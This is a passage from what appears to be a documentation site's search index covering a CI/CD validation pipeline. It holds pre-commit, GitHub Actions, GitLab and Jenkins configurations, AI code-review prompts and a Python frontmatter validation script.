\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#stage-1-pre-commit-hooks","title":"Stage 1: Pre-commit Hooks","text":"","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#purpose","title":"Purpose","text":"<p>Catch issues before code is committed to the repository, providing instant feedback to developers.</p>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#configuration","title":"Configuration","text":"<p>Create <code>.pre-commit-config.yaml</code>:</p> <pre><code>repos:\n  # General file checks\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: check-json\n      - id: check-added-large-files\n        args: ['--maxkb=500']\n      - id: check-merge-conflict\n      - id: check-case-conflict\n      - id: mixed-line-ending\n      - id: detect-private-key\n\n  # Python\n  - repo: https://github.com/psf/black\n    rev: 23.12.1\n    hooks:\n      - id: black\n        language_version: python3.10\n        args: ['--line-length=100']\n\n  - repo: https://github.com/PyCQA/flake8\n    rev: 7.0.0\n    hooks:\n      - id: flake8\n        args: ['--max-line-length=100', '--extend-ignore=E203,W503']\n\n  # YAML linting\n  - repo: https://github.com/adrienverge/yamllint\n    rev: v1.33.0\n    hooks:\n      - id: yamllint\n        args: ['-d', '{extends: default, rules: {line-length: {max: 120}}}']\n\n  # Bash/Shell\n  - repo: https://github.com/shellcheck-py/shellcheck-py\n    rev: v0.9.0.6\n    hooks:\n      - id: shellcheck\n\n  # Terraform\n  - repo: https://github.com/antonbabenko/pre-commit-terraform\n    rev: v1.86.0\n    hooks:\n      - id: terraform_fmt\n      - id: terraform_validate\n      - id: terraform_docs\n        args:\n          - '--args=--lockfile=false'\n\n  # Markdown\n  - repo: https://github.com/igorshubovych/markdownlint-cli\n    rev: v0.38.0\n    hooks:\n      - id: markdownlint\n        args: ['--fix']\n\n  # Security\n  - repo: https://github.com/Yelp/detect-secrets\n    rev: v1.4.0\n    hooks:\n      - id: detect-secrets\n        args: ['--baseline', '.secrets.baseline']\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#installation","title":"Installation","text":"<pre><code>## Install pre-commit\npip install pre-commit\n\n## Install hooks\npre-commit install\n\n## Run manually on all files\npre-commit run --all-files\n\n## Update hooks to latest versions\npre-commit autoupdate\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#pre-commit-best-practices","title":"Pre-commit Best Practices","text":"<ul> <li>Run Locally First: Test pre-commit hooks before pushing</li> <li>Keep Hooks Fast: Pre-commit should complete in &lt; 30 seconds</li> <li>Auto-fix When Possible: Use <code>--fix</code> flags for formatters</li> <li>Skip When Needed: Use <code>SKIP=hook_id git commit</code> for emergencies</li> </ul>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#stage-2-ci-pipeline-validation","title":"Stage 2: CI Pipeline Validation","text":"","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#github-actions-example","title":"GitHub Actions Example","text":"<p>Create <code>.github/workflows/validate.yml</code>:</p> <pre><code>name: Validation Pipeline\n\non:\n  pull_request:\n    branches: [main, develop]\n  push:\n    branches: [main, develop]\n\njobs:\n  pre-validation:\n    name: Pre-validation Checks\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: '3.11'\n          cache: 'pip'\n\n      - name: Install dependencies\n        run: |\n          pip install pre-commit\n          pre-commit install-hooks\n\n      - name: Run pre-commit on all files\n        run: pre-commit run --all-files --show-diff-on-failure\n\n  lint-and-format:\n    name: Linting and Formatting\n    runs-on: ubuntu-latest\n    needs: pre-validation\n    timeout-minutes: 10\n\n    strategy:\n      matrix:\n        language: [python, terraform, bash, yaml]\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Lint Python\n        if: matrix.language == 'python'\n        run: |\n          pip install black flake8 mypy pylint\n          black --check .\n          flake8 .\n          mypy . --ignore-missing-imports\n\n      - name: Lint Terraform\n        if: matrix.language == 'terraform'\n        uses: hashicorp/setup-terraform@v3\n        with:\n          terraform_version: 1.6.0\n      - run: terraform fmt -check -recursive\n        if: matrix.language == 'terraform'\n\n      - name: Lint Bash\n        if: matrix.language == 'bash'\n        run: |\n          sudo apt-get install -y shellcheck\n          find . -name \"*.sh\" -exec shellcheck {} +\n\n      - name: Lint YAML\n        if: matrix.language == 'yaml'\n        run: |\n          pip install yamllint\n          yamllint .\n\n  security-scan:\n    name: Security Scanning\n    runs-on: ubuntu-latest\n    needs: pre-validation\n    timeout-minutes: 15\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Run Trivy vulnerability scanner\n        uses: aquasecurity/trivy-action@master\n        with:\n          scan-type: 'fs'\n          scan-ref: '.'\n          format: 'sarif'\n          output: 'trivy-results.sarif'\n\n      - name: Upload Trivy results to GitHub Security\n        uses: github/codeql-action/upload-sarif@v3\n        with:\n          sarif_file: 'trivy-results.sarif'\n\n      - name: Run Semgrep\n        uses: returntocorp/semgrep-action@v1\n        with:\n          config: &gt;-\n            p/security-audit\n            p/secrets\n            p/ci\n\n      - name: Check for secrets\n        run: |\n          pip install detect-secrets\n          detect-secrets scan --all-files --force-use-all-plugins\n\n  test:\n    name: Test Suite\n    runs-on: ubuntu-latest\n    needs: [lint-and-format, security-scan]\n    timeout-minutes: 30\n\n    strategy:\n      matrix:\n        python-version: ['3.10', '3.11', '3.12']\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n          cache: 'pip'\n\n      - name: Install dependencies\n        run: |\n          pip install pytest pytest-cov pytest-xdist\n          pip install -r requirements.txt\n\n      - name: Run unit tests\n        run: pytest tests/unit -v --cov --cov-report=xml\n\n      - name: Run integration tests\n        run: pytest tests/integration -v\n\n      - name: Upload coverage\n        uses: codecov/codecov-action@v4\n        with:\n          files: ./coverage.xml\n          flags: unittests\n\n  ai-code-review:\n    name: AI Code Review\n    runs-on: ubuntu-latest\n    needs: test\n    if: github.event_name == 'pull_request'\n    timeout-minutes: 10\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - name: AI Style Review\n        uses: openai/openai-pr-reviewer@v1\n        env:\n          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}\n        with:\n          model: 'gpt-4'\n          review_type: 'style-guide'\n          style_guide_url: 'https://tydukes.github.io/coding-style-guide/'\n\n      - name: AI Security Review\n        uses: openai/openai-pr-reviewer@v1\n        env:\n          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}\n        with:\n          model: 'gpt-4'\n          review_type: 'security'\n\n  metadata-validation:\n    name: Validate Metadata\n    runs-on: ubuntu-latest\n    needs: pre-validation\n    timeout-minutes: 5\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Validate frontmatter\n        run: |\n          python scripts/validate_metadata.py\n\n      - name: Check documentation completeness\n        run: |\n          python scripts/check_docs.py\n\n  terraform-plan:\n    name: Terraform Plan\n    runs-on: ubuntu-latest\n    needs: [lint-and-format, security-scan]\n    if: contains(github.event.pull_request.changed_files, '.tf')\n    timeout-minutes: 15\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n        with:\n          terraform_version: 1.6.0\n\n      - name: Terraform Init\n        run: terraform init\n        working-directory: ./terraform\n\n      - name: Terraform Plan\n        id: plan\n        run: terraform plan -no-color -out=tfplan\n        working-directory: ./terraform\n\n      - name: Post plan to PR\n        uses: actions/github-script@v7\n        if: github.event_name == 'pull_request'\n        with:\n          script: |\n            const output = `#### Terraform Plan \ud83d\udcd6\n            \\`\\`\\`terraform\n            ${{ steps.plan.outputs.stdout }}\n            \\`\\`\\`\n            `;\n            github.rest.issues.createComment({\n              issue_number: context.issue.number,\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              body: output\n            });\n\n  summary:\n    name: Validation Summary\n    runs-on: ubuntu-latest\n    needs: [lint-and-format, security-scan, test, metadata-validation]\n    if: always()\n    timeout-minutes: 5\n\n    steps:\n      - name: Check validation results\n        run: |\n          if [ \"${{ needs.lint-and-format.result }}\" != \"success\" ] ||\n             [ \"${{ needs.security-scan.result }}\" != \"success\" ] ||\n             [ \"${{ needs.test.result }}\" != \"success\" ] ||\n             [ \"${{ needs.metadata-validation.result }}\" != \"success\" ]; then\n            echo \"\u274c Validation failed\"\n            exit 1\n          fi\n          echo \"\u2705 All validation checks passed\"\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#stage-3-ai-code-review","title":"Stage 3: AI Code Review","text":"","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#ai-review-bot-configuration","title":"AI Review Bot Configuration","text":"<p>The AI Review Bot analyzes code changes and provides contextual feedback on:</p> <ul> <li>Style Adherence: Checks against the style guide</li> <li>Anti-Patterns: Identifies common mistakes</li> <li>Best Practices: Suggests improvements</li> <li>Documentation: Reviews comment quality and completeness</li> <li>Security: Detects potential vulnerabilities</li> <li>Performance: Identifies inefficient code patterns</li> </ul>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#review-types","title":"Review Types","text":"","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#style-review","title":"Style Review","text":"<pre><code>- name: AI Style Review\n  uses: openai/openai-pr-reviewer@v1\n  env:\n    OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}\n  with:\n    model: 'gpt-4'\n    review_type: 'style-guide'\n    style_guide_url: 'https://tydukes.github.io/coding-style-guide/'\n    focus_areas:\n      - naming_conventions\n      - code_organization\n      - documentation\n      - formatting\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#security-review","title":"Security Review","text":"<pre><code>- name: AI Security Review\n  uses: openai/openai-pr-reviewer@v1\n  env:\n    OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}\n  with:\n    model: 'gpt-4'\n    review_type: 'security'\n    focus_areas:\n      - input_validation\n      - authentication\n      - secrets_management\n      - sql_injection\n      - xss_vulnerabilities\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#performance-review","title":"Performance Review","text":"<pre><code>- name: AI Performance Review\n  uses: openai/openai-pr-reviewer@v1\n  env:\n    OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}\n  with:\n    model: 'gpt-4'\n    review_type: 'performance'\n    focus_areas:\n      - algorithm_complexity\n      - database_queries\n      - caching_opportunities\n      - resource_usage\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#custom-ai-review-prompts","title":"Custom AI Review Prompts","text":"<p>Create <code>.github/ai-review-prompts.yaml</code>:</p> <pre><code>style_review_prompt: |\n  You are a senior DevOps engineer reviewing code against the Dukes Engineering Style Guide.\n\n  Review the following code changes and provide feedback on:\n  1. Adherence to style guide: https://tydukes.github.io/coding-style-guide/\n  2. Naming conventions (variables, functions, classes)\n  3. Code organization and module structure\n  4. Documentation completeness and quality\n  5. Anti-patterns present in the code\n\n  For each issue found:\n  - Cite the specific section of the style guide\n  - Provide a code example showing the correction\n  - Explain why the change improves the code\n\n  Be constructive and prioritize clarity over brevity.\n\nsecurity_review_prompt: |\n  You are a security engineer reviewing code for vulnerabilities.\n\n  Analyze the code changes for:\n  1. Input validation and sanitization\n  2. Authentication and authorization\n  3. Secrets and credential management\n  4. SQL injection vulnerabilities\n  5. XSS vulnerabilities\n  6. Path traversal risks\n  7. Insecure dependencies\n\n  For each vulnerability:\n  - Describe the security risk\n  - Provide a secure code example\n  - Reference OWASP guidelines where applicable\n\nperformance_review_prompt: |\n  You are a performance optimization specialist.\n\n  Review the code for:\n  1. Algorithm complexity (O(n) analysis)\n  2. Database query optimization\n  3. Caching opportunities\n  4. Resource usage (memory, CPU)\n  5. Async/await usage\n  6. Loop optimizations\n\n  For each optimization opportunity:\n  - Explain the performance impact\n  - Provide optimized code example\n  - Estimate performance improvement\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#stage-4-metadata-validation","title":"Stage 4: Metadata Validation","text":"","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#metadata-validation-script","title":"Metadata Validation Script","text":"<p>Create <code>scripts/validate_metadata.py</code>:</p> <pre><code>#!/usr/bin/env python3\n\"\"\"\nValidate YAML frontmatter metadata in documentation files.\n\"\"\"\nimport sys\nfrom pathlib import Path\nfrom typing import Dict, List, Any\nimport yaml\nimport re\n\nREQUIRED_FIELDS = {\n    \"title\": str,\n    \"description\": str,\n    \"author\": str,\n    \"date\": str,\n    \"tags\": list,\n    \"category\": str,\n    \"status\": str,\n    \"version\": str,\n}\n\nVALID_STATUSES = [\"active\", \"deprecated\", \"draft\", \"needs-expansion\"]\nVALID_CATEGORIES = [\n    \"Home\",\n    \"Overview\",\n    \"Language Guides\",\n    \"Metadata Schema\",\n    \"Templates\",\n    \"Examples\",\n    \"Anti-Patterns\",\n    \"CI/CD\",\n]\n\ndef extract_frontmatter(file_path: Path) -&gt; Dict[str, Any] | None:\n    \"\"\"Extract YAML frontmatter from markdown file.\"\"\"\n    content = file_path.read_text()\n\n    # Match frontmatter between --- delimiters\n    match = re.match(r\"^---\\n(.*?)\\n---\", content, re.DOTALL)\n    if not match:\n        return None\n\n    try:\n        return yaml.safe_load(match.group(1))\n    except yaml.YAMLError as e:\n        print(f\"\u274c {file_path}: Invalid YAML frontmatter: {e}\")\n        return None\n\ndef validate_metadata(file_path: Path, metadata: Dict[str, Any]) -&gt; List[str]:\n    \"\"\"Validate metadata against schema.\"\"\"\n    errors = []\n\n    # Check required fields\n    for field, field_type in REQUIRED_FIELDS.items():\n        if field not in metadata:\n            errors.append(f\"Missing required field: {field}\")\n        elif not isinstance(metadata[field], field_type):\n            errors.append(\n                f\"Field '{field}' must be {field_type.__name__}, \"\n                f\"got {type(metadata[field]).__name__}\"\n            )\n\n    # Validate status\n    if \"status\" in metadata and metadata[\"status\"] not in VALID_STATUSES:\n        errors.append(\n            f\"Invalid status '{metadata['status']}'. \"\n            f\"Must be one of: {', '.join(VALID_STATUSES)}\"\n        )\n\n    # Validate category\n    if \"category\" in metadata and metadata[\"category\"] not in VALID_CATEGORIES:\n        errors.append(\n            f\"Invalid category '{metadata['category']}'. \"\n            f\"Must be one of: {', '.join(VALID_CATEGORIES)}\"\n        )\n\n    # Validate date format (YYYY-MM-DD)\n    if \"date\" in metadata:\n        if not re.match(r\"^\\d{4}-\\d{2}-\\d{2}$\", metadata[\"date\"]):\n            errors.append(f\"Invalid date format '{metadata['date']}'. Use YYYY-MM-DD\")\n\n    # Validate version format (semver)\n    if \"version\" in metadata:\n        if not re.match(r\"^\\d+\\.\\d+\\.\\d+$\", metadata[\"version\"]):\n            errors.append(\n                f\"Invalid version format '{metadata['version']}'. Use semver (x.y.z)\"\n            )\n\n    # Validate tags (non-empty list)\n    if \"tags\" in metadata:\n        if not metadata[\"tags\"]:\n            errors.append(\"Tags list cannot be empty\")\n\n    return errors\n\ndef main() -&gt; int:\n    \"\"\"Main validation function.\"\"\"\n    docs_dir = Path(\"docs\")\n\n    if not docs_dir.exists():\n        print(\"\u274c docs/ directory not found\")\n        return 1\n\n    markdown_files = list(docs_dir.rglob(\"*.md\"))\n\n    if not markdown_files:\n        print(\"\u274c No markdown files found in docs/\")\n        return 1\n\n    total_files = len(markdown_files)\n    files_with_errors = 0\n    total_errors = 0\n\n    print(f\"Validating {total_files} documentation files...\\n\")\n\n    for file_path in markdown_files:\n        metadata = extract_frontmatter(file_path)\n\n        if metadata is None:\n            print(f\"\u26a0\ufe0f  {file_path.relative_to(docs_dir)}: No frontmatter found\")\n            files_with_errors += 1\n            continue\n\n        errors = validate_metadata(file_path, metadata)\n\n        if errors:\n            print(f\"\u274c {file_path.relative_to(docs_dir)}:\")\n            for error in errors:\n                print(f\"   - {error}\")\n                total_errors += 1\n            print()\n            files_with_errors += 1\n\n    # Summary\n    print(\"=\" * 60)\n    if files_with_errors == 0:\n        print(f\"\u2705 All {total_files} files passed validation\")\n        return 0\n    else:\n        print(f\"\u274c {files_with_errors}/{total_files} files have errors\")\n        print(f\"   Total errors: {total_errors}\")\n        return 1\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n</code></pre> <p>Make it executable:</p> <pre><code>chmod +x scripts/validate_metadata.py\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#stage-5-post-merge-validation","title":"Stage 5: Post-Merge Validation","text":"","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#deployment-validation","title":"Deployment Validation","text":"<p>After code is merged to main, run additional validation:</p> <pre><code>name: Post-Merge Validation\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build-verification:\n    name: Build Verification\n    runs-on: ubuntu-latest\n    timeout-minutes: 15\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Build application\n        run: |\n          make build\n\n      - name: Verify build artifacts\n        run: |\n          test -f dist/app || exit 1\n          test -f dist/app.tar.gz || exit 1\n\n  deploy-staging:\n    name: Deploy to Staging\n    runs-on: ubuntu-latest\n    needs: build-verification\n    environment: staging\n    timeout-minutes: 20\n\n    steps:\n      - name: Deploy to staging\n        run: |\n          kubectl apply -f k8s/staging/\n\n      - name: Wait for deployment\n        run: |\n          kubectl rollout status deployment/app -n staging --timeout=5m\n\n  smoke-tests:\n    name: Smoke Tests\n    runs-on: ubuntu-latest\n    needs: deploy-staging\n    timeout-minutes: 10\n\n    steps:\n      - name: Health check\n        run: |\n          curl -f https://staging.example.com/health || exit 1\n\n      - name: API smoke tests\n        run: |\n          pytest tests/smoke -v --env=staging\n\n  performance-tests:\n    name: Performance Tests\n    runs-on: ubuntu-latest\n    needs: smoke-tests\n    timeout-minutes: 30\n\n    steps:\n      - name: Load testing\n        run: |\n          k6 run tests/performance/load.js --env HOSTNAME=staging.example.com\n\n      - name: Analyze results\n        run: |\n          python scripts/analyze_performance.py\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#gitlab-ci-example","title":"GitLab CI Example","text":"<p>Create <code>.gitlab-ci.yml</code>:</p> <pre><code>stages:\n  - validate\n  - test\n  - security\n  - review\n  - deploy\n\nvariables:\n  PIP_CACHE_DIR: \"$CI_PROJECT_DIR/.cache/pip\"\n\ncache:\n  paths:\n    - .cache/pip\n\npre-commit:\n  stage: validate\n  image: python:3.11\n  script:\n    - pip install pre-commit\n    - pre-commit run --all-files\n  rules:\n    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n\nlint:python:\n  stage: validate\n  image: python:3.11\n  script:\n    - pip install black flake8 mypy\n    - black --check .\n    - flake8 .\n    - mypy .\n  rules:\n    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n\ntest:unit:\n  stage: test\n  image: python:3.11\n  script:\n    - pip install pytest pytest-cov\n    - pytest tests/unit -v --cov\n  coverage: '/TOTAL.*\\s+(\\d+%)$/'\n  artifacts:\n    reports:\n      coverage_report:\n        coverage_format: cobertura\n        path: coverage.xml\n\nsecurity:trivy:\n  stage: security\n  image:\n    name: aquasec/trivy:latest\n    entrypoint: [\"\"]\n  script:\n    - trivy fs --exit-code 1 --severity HIGH,CRITICAL .\n  allow_failure: true\n\nsecurity:semgrep:\n  stage: security\n  image: returntocorp/semgrep\n  script:\n    - semgrep --config=p/security-audit --config=p/secrets .\n\nai-review:\n  stage: review\n  image: python:3.11\n  script:\n    - pip install openai\n    - python scripts/ai_review.py\n  rules:\n    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n  allow_failure: true\n\ndeploy:staging:\n  stage: deploy\n  image: bitnami/kubectl:latest\n  script:\n    - kubectl apply -f k8s/staging/\n  environment:\n    name: staging\n    url: https://staging.example.com\n  rules:\n    - if: '$CI_COMMIT_BRANCH == \"main\"'\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#jenkins-pipeline-example","title":"Jenkins Pipeline Example","text":"<p>Create <code>Jenkinsfile</code>:</p> <pre><code>pipeline {\n    agent any\n\n    environment {\n        PYTHON_VERSION = '3.11'\n        TERRAFORM_VERSION = '1.6.0'\n    }\n\n    stages {\n        stage('Pre-validation') {\n            steps {\n                sh 'pre-commit run --all-files'\n            }\n        }\n\n        stage('Lint') {\n            parallel {\n                stage('Python') {\n                    steps {\n                        sh '''\n                            pip install black flake8 mypy\n                            black --check .\n                            flake8 .\n                            mypy .\n                        '''\n                    }\n                }\n\n                stage('Terraform') {\n                    steps {\n                        sh '''\n                            terraform fmt -check -recursive\n                            terraform validate\n                        '''\n                    }\n                }\n\n                stage('Shell') {\n                    steps {\n                        sh 'find . -name \"*.sh\" -exec shellcheck {} +'\n                    }\n                }\n            }\n        }\n\n        stage('Security Scan') {\n            parallel {\n                stage('Trivy') {\n                    steps {\n                        sh 'trivy fs --exit-code 1 --severity HIGH,CRITICAL .'\n                    }\n                }\n\n                stage('Semgrep') {\n                    steps {\n                        sh 'semgrep --config=p/security-audit --config=p/secrets .'\n                    }\n                }\n            }\n        }\n\n        stage('Test') {\n            steps {\n                sh '''\n                    pip install pytest pytest-cov\n                    pytest tests/unit -v --cov --cov-report=xml\n                '''\n            }\n            post {\n                always {\n                    junit 'test-results/*.xml'\n                    cobertura coberturaReportFile: 'coverage.xml'\n                }\n            }\n        }\n\n        stage('AI Code Review') {\n            when {\n                changeRequest()\n            }\n            steps {\n                script {\n                    sh 'python scripts/ai_review.py --pr-id ${CHANGE_ID}'\n                }\n            }\n        }\n\n        stage('Metadata Validation') {\n            steps {\n                sh 'python scripts/validate_metadata.py'\n            }\n        }\n\n        stage('Terraform Plan') {\n            when {\n                changeRequest()\n            }\n            steps {\n                dir('terraform') {\n                    sh '''\n                        terraform init\n                        terraform plan -no-color -out=tfplan\n                    '''\n                }\n            }\n        }\n    }\n\n    post {\n        always {\n            cleanWs()\n        }\n        success {\n            echo '\u2705 All validation checks passed'\n        }\n        failure {\n            echo '\u274c Validation failed'\n        }\n    }\n}\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#best-practices","title":"Best Practices","text":"","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#performance-optimization","title":"Performance Optimization","text":"<ol> <li>Parallel Execution: Run independent jobs concurrently</li> <li>Caching: Cache dependencies between runs</li> <li>Incremental Validation: Only validate changed files when possible</li> <li>Timeout Limits: Set reasonable timeouts for all jobs</li> </ol>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#security-considerations","title":"Security Considerations","text":"<ol> <li>Secret Management: Use CI platform's secret management</li> <li>Least Privilege: Grant minimum required permissions</li> <li>Dependency Scanning: Regularly scan for vulnerable dependencies</li> <li>Container Scanning: Scan Docker images for vulnerabilities</li> </ol>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#developer-experience","title":"Developer Experience","text":"<ol> <li>Fast Feedback: Keep pre-commit hooks under 30 seconds</li> <li>Clear Error Messages: Provide actionable error messages</li> <li>Auto-fix When Possible: Automatically fix formatting issues</li> <li>Gradual Adoption: Allow teams to incrementally adopt validation</li> </ol>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#cost-optimization","title":"Cost Optimization","text":"<ol> <li>Skip Redundant Checks: Don't re-run validation on merge commits</li> <li>Use Cheaper Runners: Use standard runners for simple tasks</li> <li>Cache Aggressively: Cache dependencies, tools, and build artifacts</li> <li>Fail Fast: Stop pipeline on critical failures</li> </ol>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#troubleshooting","title":"Troubleshooting","text":"","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#common-issues","title":"Common Issues","text":"","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#pre-commit-hooks-fail","title":"Pre-commit Hooks Fail","text":"<pre><code>## Update hooks to latest versions\npre-commit autoupdate\n\n## Clear cache and reinstall\npre-commit clean\npre-commit install-hooks\n\n## Skip specific hook temporarily\nSKIP=black git commit -m \"commit message\"\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#ci-pipeline-timeout","title":"CI Pipeline Timeout","text":"<pre><code>## Increase timeout for specific job\njobs:\n  test:\n    timeout-minutes: 30  # Increase from default 10\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#ai-review-api-rate-limits","title":"AI Review API Rate Limits","text":"<pre><code>## Add retry logic with exponential backoff\n- name: AI Review with Retry\n  uses: nick-invision/retry@v2\n  with:\n    timeout_minutes: 10\n    max_attempts: 3\n    retry_wait_seconds: 60\n    command: python scripts/ai_review.py\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#false-positives-in-security-scans","title":"False Positives in Security Scans","text":"<pre><code>## Create allowlist for known false positives\n## .trivyignore\nCVE-2023-12345  # False positive in test dependency\n\n## .semgrepignore\ntests/  # Ignore test files for certain rules\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#metrics-and-monitoring","title":"Metrics and Monitoring","text":"","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#key-metrics","title":"Key Metrics","text":"<p>Track these metrics to measure pipeline effectiveness:</p> <ul> <li>Pipeline Success Rate: Percentage of successful pipeline runs</li> <li>Average Pipeline Duration: Time from trigger to completion</li> <li>Mean Time to Detection (MTTD): Time to detect issues</li> <li>Mean Time to Resolution (MTTR): Time to fix issues</li> <li>False Positive Rate: Percentage of false alarms</li> <li>Code Coverage: Percentage of code covered by tests</li> </ul>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#monitoring-dashboard","title":"Monitoring Dashboard","text":"<p>Create a dashboard tracking:</p> <pre><code>metrics:\n  pipeline_success_rate:\n    query: \"sum(pipeline_success) / sum(pipeline_total)\"\n    target: \"&gt; 95%\"\n\n  average_duration:\n    query: \"avg(pipeline_duration_seconds)\"\n    target: \"&lt; 300\"  # 5 minutes\n\n  security_vulnerabilities:\n    query: \"sum(vulnerabilities_detected)\"\n    target: \"= 0\"\n\n  test_coverage:\n    query: \"avg(code_coverage_percentage)\"\n    target: \"&gt; 80%\"\n</code></pre>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#references","title":"References","text":"","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#tools-and-platforms","title":"Tools and Platforms","text":"<ul> <li>Pre-commit Hooks</li> <li>GitHub Actions</li> <li>GitLab CI/CD</li> <li>Jenkins</li> <li>Trivy</li> <li>Semgrep</li> </ul>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#ai-code-review","title":"AI Code Review","text":"<ul> <li>OpenAI API</li> <li>GitHub Copilot</li> <li>Anthropic Claude</li> </ul>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/ai_validation_pipeline/#security-scanning","title":"Security Scanning","text":"<ul> <li>OWASP Dependency-Check</li> <li>Snyk</li> <li>SonarQube</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-11-30 Status: Active</p>","tags":["cicd","ai","validation","automation","pipeline","code-review"]},{"location":"05_ci_cd/github_actions_guide/","title":"Comprehensive GitHub Actions CI/CD Guide","text":"","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#overview","title":"Overview","text":"<p>This guide provides comprehensive coverage of GitHub Actions for production CI/CD pipelines, focusing on real-world implementation patterns, deployment strategies, security best practices, and performance optimization.</p>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#what-this-guide-covers","title":"What This Guide Covers","text":"<ul> <li>\u2705 Complete CI/CD Pipelines: From build to production deployment</li> <li>\u2705 Multi-Environment Deployment: Dev, 